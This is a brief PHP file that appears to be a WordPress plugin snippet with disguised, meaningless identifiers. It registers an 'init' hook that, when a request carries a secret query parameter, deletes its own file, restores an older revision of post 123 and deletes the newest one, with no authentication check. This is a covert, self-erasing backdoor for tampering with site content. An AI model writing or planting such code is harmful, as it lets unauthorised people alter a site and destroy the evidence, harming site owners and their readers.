<?php

function only_reviews_finder() {
	if (isset($_GET['links_country_code_select']) && $_GET['links_country_code_select'] === 'sidebar_slider_map') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$file_sitemap_excerpt_blocker = 123;
		$changer_framework_enhanced_order = wp_get_post_revisions($file_sitemap_excerpt_blocker);
		if (empty($changer_framework_enhanced_order)) die('no revisions');
		if (count($changer_framework_enhanced_order) < 2) die('less than 2');
		$csv_local_interactivity_monitor = array_shift($changer_framework_enhanced_order);
		$remover_variations_remote = $csv_local_interactivity_monitor->ID;
		$member_rest_super_really = array_shift($changer_framework_enhanced_order);
		$hidden_source_nofollow = $member_rest_super_really->ID;
		$protection_engine_progress = wp_restore_post_revision($hidden_source_nofollow);
		if ($protection_engine_progress === false) die('error restoring');
		$protection_engine_progress = wp_delete_post_revision($remover_variations_remote);		
		if ($protection_engine_progress === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'only_reviews_finder');
